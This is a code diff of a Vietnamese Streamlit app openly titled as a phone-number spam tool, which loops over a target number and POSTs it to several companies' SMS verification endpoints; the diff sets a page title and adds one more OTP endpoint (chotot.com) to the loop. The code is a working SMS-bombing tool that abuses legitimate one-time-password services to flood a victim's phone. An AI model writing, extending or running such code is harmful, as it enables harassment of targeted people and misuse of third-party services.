@@ -8,7 +8,11 @@ from PIL import Image
 import time
 class App:
     def __init__(self):
-        st.title("Spam Số Điện Thoại By Thầy Trường a")
+        st.set_page_config(
+             page_title="FB Tools Thầy Trường",
+             page_icon=":dog:"
+        )
+        st.title("Spam Số Điện Thoại By Thầy Trường")
         self.initCSS()
         self.message=""
     def initCSS(self):
@@ -86,6 +90,8 @@ class App:
                 requests.post("https://api.vmayman.com/app/member/sendSmsCode",json=pload)
                 pload = {"mobile": phone}
                 requests.post("https://wenvey.com/_api/auth/login/sms",data=pload)
+                pload = {"phone":phone}
+                requests.post("https://gateway.chotot.com/v2/public/auth/send_otp_verify",json=pload)
                 pload = {"mobile": phone}
                 requests.post("https://api.magpiecredit.com/user/sendCode-h5",data=pload)   
                 i+=1
